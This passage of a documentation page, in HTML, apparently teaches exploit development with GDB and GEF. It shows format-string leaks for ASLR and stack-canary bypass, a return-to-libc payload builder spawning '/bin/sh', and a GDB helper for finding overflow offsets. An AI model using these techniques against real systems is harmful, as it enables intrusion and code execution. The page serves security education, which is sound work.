class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">printf</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;%p %p %p %p&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">10</span><span class="token plain">              </span><span class="token comment" style="color:rgb(98, 114, 164)"># Look for leaked addresses</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Calculate libc base from leaked address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ vmmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ python</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">leaked_addr </span><span class="token operator">=</span><span class="token plain"> 0x7ffff7a52083</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">libc_base </span><span class="token operator">=</span><span class="token plain"> leaked_addr - 0x52083   </span><span class="token comment" style="color:rgb(98, 114, 164)"># Offset to libc base</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">system_addr </span><span class="token operator">=</span><span class="token plain"> libc_base + 0x4f420   </span><span class="token comment" style="color:rgb(98, 114, 164)"># Offset to system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">binsh_addr </span><span class="token operator">=</span><span class="token plain"> libc_base + 0x1b40cf   </span><span class="token comment" style="color:rgb(98, 114, 164)"># Offset to &quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">f</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Libc base: {hex(libc_base)}&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">f</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;System: {hex(system_addr)}&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">f</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh: {hex(binsh_addr)}&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="scenario-2-stack-canary-bypass">Scenario 2: Stack Canary Bypass<a href="#scenario-2-stack-canary-bypass" class="hash-link" aria-label="Direct link to Scenario 2: Stack Canary Bypass" title="Direct link to Scenario 2: Stack Canary Bypass" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># When stack canaries are present</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Shows Canary found</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Look for canary leak or brute force single byte</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ canary                         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Show current canary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">break</span><span class="token plain"> __stack_chk_fail         </span><span class="token comment" style="color:rgb(98, 114, 164)"># Break on canary failure</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token function" style="color:rgb(80, 250, 123)">watch</span><span class="token plain"> *</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbp</span><span class="token plain">-0x8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">              </span><span class="token comment" style="color:rgb(98, 114, 164)"># Watch canary location</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Canary leak via format string</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;AAAA.%p.%p.%p.%p.%p.%p.%p&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Look for canary value in output (usually starts with 0x00)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="scenario-3-return-to-libc-attack">Scenario 3: Return-to-libc Attack<a href="#scenario-3-return-to-libc-attack" class="hash-link" aria-label="Direct link to Scenario 3: Return-to-libc Attack" title="Direct link to Scenario 3: Return-to-libc Attack" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Classic return-to-libc for NX bypass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Shows NX enabled (no stack execution)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Find libc functions and strings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info sharedlibrary</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;system&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;exit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Construct ret2libc chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># payload = padding + system + exit + &quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">import struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload = b&#x27;A&#x27; * 76                  # 32-bit padding</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;I&#x27;, 0xf7e16200)  # system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;I&#x27;, 0xf7e09cf0)  # exit  </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;I&#x27;, 0xf7f5a0cf)  # &#x27;/bin/sh&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">print(payload)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="debugging-tips-and-best-practices">Debugging Tips and Best Practices<a href="#debugging-tips-and-best-practices" class="hash-link" aria-label="Direct link to Debugging Tips and Best Practices" title="Direct link to Debugging Tips and Best Practices" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="essential-gef-configuration">Essential GEF Configuration<a href="#essential-gef-configuration" class="hash-link" aria-label="Direct link to Essential GEF Configuration" title="Direct link to Essential GEF Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Optimize GEF for exploitation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config context.layout </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;legend regs stack code args memory&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config context.nb_lines_stack </span><span class="token number">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config context.nb_lines_code </span><span class="token number">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config theme.default_title_line </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;red&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config theme.default_title_message </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;white&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Performance optimizations</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config context.clear_screen False</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config context.redirect </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef config heap.main_arena </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="common-pitfalls-and-solutions">Common Pitfalls and Solutions<a href="#common-pitfalls-and-solutions" class="hash-link" aria-label="Direct link to Common Pitfalls and Solutions" title="Direct link to Common Pitfalls and Solutions" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Issue: Pattern not found in registers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Solution: Check for partial overwrites</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain">            </span><span class="token comment" style="color:rgb(98, 114, 164)"># Check stack pointer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ pattern search *</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbp</span><span class="token plain">+8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">       </span><span class="token comment" style="color:rgb(98, 114, 164)"># Check saved return address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Issue: ROP gadget not working  </span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Solution: Verify gadget addresses and alignment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ x/5i 0x401273                  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Examine gadget instructions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ disassemble 0x401270,0x401280  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Context around gadget</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Issue: Segfault on exploitation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Solution: Check address validity and permissions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ vmmap                          </span><span class="token comment" style="color:rgb(98, 114, 164)"># Check memory permissions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ telescope </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain"> </span><span class="token number">20</span><span class="token plain">              </span><span class="token comment" style="color:rgb(98, 114, 164)"># Examine stack corruption</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="advanced-automation">Advanced Automation<a href="#advanced-automation" class="hash-link" aria-label="Direct link to Advanced Automation" title="Direct link to Advanced Automation" translate="no">‚Äã</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># GEF Python automation script</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Save as exploit_automation.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> gdb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">ExploitHelper</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Command</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token builtin" style="color:rgb(189, 147, 249)">super</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">ExploitHelper</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;exploit-helper&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">COMMAND_USER</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">invoke</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> arg</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> from_tty</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Find buffer overflow offset automatically</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pattern create 1000&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;run PATTERN_HERE&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Get crashed RIP/EIP value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">selected_inferior</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pid </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                rip </span><span class="token operator">=</span><span class="token plain"> gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">parse_and_eval</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;$rip&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f&quot;pattern search </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">rip</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">except</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                eip </span><span class="token operator">=</span><span class="token plain"> gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">parse_and_eval</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;$eip&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                gdb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f&quot;pattern search </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">eip</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ExploitHelper</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Usage: exploit-helper</span><br></span></code></pre></div></div>
<p>This comprehensive set of practical examples demonstrates the power of GDB with GEF for both 32-bit and 64-bit exploitation scenarios. The examples show real exploitation techniques with complete workflows, from initial analysis through successful exploitation, highlighting the key differences between architectures and providing practical commands for each step of the process.</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/gdb">gdb</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/gef">gef</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/buffer-overflow">buffer-overflow</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/exploit-development">exploit-development</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/reverse-engineering">reverse-engineering</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/tags/debugging">debugging</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/reverse/gdb_examples.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2025-07-02T00:00:00.000Z" itemprop="dateModified">Jul 2, 2025</time></b></span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/reverse/gdb-gef-practical-guide"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Debugging with GDB/GEF</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/reverse/binary-refinery-practical-guide"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Binary Refinery Practical</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#example-1-32-bit-buffer-overflow-exploitation" class="table-of-contents__link toc-highlight">Example 1: 32-bit Buffer Overflow Exploitation</a><ul><li><a href="#target-application-vuln32c" class="table-of-contents__link toc-highlight">Target Application (vuln32.c)</a></li><li><a href="#compilation-and-setup" class="table-of-contents__link toc-highlight">Compilation and Setup</a></li><li><a href="#gef-analysis-session" class="table-of-contents__link toc-highlight">GEF Analysis Session</a></li><li><a href="#detailed-32-bit-analysis-commands" class="table-of-contents__link toc-highlight">Detailed 32-bit Analysis Commands</a></li></ul></li><li><a href="#example-2-64-bit-buffer-overflow-with-rop-chain" class="table-of-contents__link toc-highlight">Example 2: 64-bit Buffer Overflow with ROP Chain</a><ul><li><a href="#target-application-vuln64c" class="table-of-contents__link toc-highlight">Target Application (vuln64.c)</a></li><li><a href="#compilation-and-setup-1" class="table-of-contents__link toc-highlight">Compilation and Setup</a></li><li><a href="#gef-analysis-session-1" class="table-of-contents__link toc-highlight">GEF Analysis Session</a></li><li><a href="#advanced-64-bit-rop-chain-analysis" class="table-of-contents__link toc-highlight">Advanced 64-bit ROP Chain Analysis</a></li><li><a href="#comprehensive-analysis-commands" class="table-of-contents__link toc-highlight">Comprehensive Analysis Commands</a></li></ul></li><li><a href="#key-differences-between-32-bit-and-64-bit-exploitation" class="table-of-contents__link toc-highlight">Key Differences Between 32-bit and 64-bit Exploitation</a><ul><li><a href="#32-bit-characteristics" class="table-of-contents__link toc-highlight">32-bit Characteristics:</a></li><li><a href="#64-bit-characteristics" class="table-of-contents__link toc-highlight">64-bit Characteristics:</a></li></ul></li><li><a href="#advanced-exploitation-techniques" class="table-of-contents__link toc-highlight">Advanced Exploitation Techniques</a><ul><li><a href="#32-bit-function-call-exploitation" class="table-of-contents__link toc-highlight">32-bit Function Call Exploitation</a></li><li><a href="#64-bit-rop-chain-with-arguments" class="table-of-contents__link toc-highlight">64-bit ROP Chain with Arguments</a></li></ul></li><li><a href="#comprehensive-gef-analysis-workflow" class="table-of-contents__link toc-highlight">Comprehensive GEF Analysis Workflow</a><ul><li><a href="#complete-32-bit-analysis-session" class="table-of-contents__link toc-highlight">Complete 32-bit Analysis Session</a></li><li><a href="#complete-64-bit-analysis-session" class="table-of-contents__link toc-highlight">Complete 64-bit Analysis Session</a></li></ul></li><li><a href="#advanced-gef-commands-for-exploitation" class="table-of-contents__link toc-highlight">Advanced GEF Commands for Exploitation</a><ul><li><a href="#memory-analysis-commands" class="table-of-contents__link toc-highlight">Memory Analysis Commands</a></li><li><a href="#control-flow-analysis" class="table-of-contents__link toc-highlight">Control Flow Analysis</a></li><li><a href="#exploitation-assistance-commands" class="table-of-contents__link toc-highlight">Exploitation Assistance Commands</a></li></ul></li><li><a href="#real-world-exploitation-scenarios" class="table-of-contents__link toc-highlight">Real-World Exploitation Scenarios</a><ul><li><a href="#scenario-1-aslr-bypass-with-information-leak" class="table-of-contents__link toc-highlight">Scenario 1: ASLR Bypass with Information Leak</a></li><li><a href="#scenario-2-stack-canary-bypass" class="table-of-contents__link toc-highlight">Scenario 2: 